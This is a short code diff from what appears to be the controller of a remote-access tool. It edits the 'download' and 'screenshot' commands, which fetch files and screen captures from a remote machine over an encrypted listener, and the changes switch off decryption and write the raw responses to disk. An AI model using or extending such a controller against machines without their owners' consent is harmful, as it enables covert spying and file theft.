@@ -82,11 +82,12 @@ def main():
             }).encode('utf-8')
 
             response = listener.prompt(cipher.encrypt_message(request))
-            decrypted = cipher.decrypt_message(response)
+            # decrypted = cipher.decrypt_message(response)
             file = open('download/' + params, 'wb')
-            file.write(decrypted.encode('UTF-8'))
+            file.write(response)
             file.close()
             print("Download complete!")
+
 
         elif command == "screenshot":
             request = json.dumps({
@@ -94,12 +95,9 @@ def main():
                 'action': params
             }).encode('utf-8')
             response = listener.prompt(cipher.encrypt_message(request))
-            print(response)
-            decrypted = cipher.decrypt_image(response)
-            # print(decrypted)
-            # now = datetime.now()
-            file = open('download/screenshot_xxx.png', 'wb')
-            file.write(decrypted.decode("utf-8"))
+            now = datetime.now()
+            file = open("download/screenshot_xxx.png", 'wb')
+            file.write(response)
             file.close()
             print("Download complete!")
 
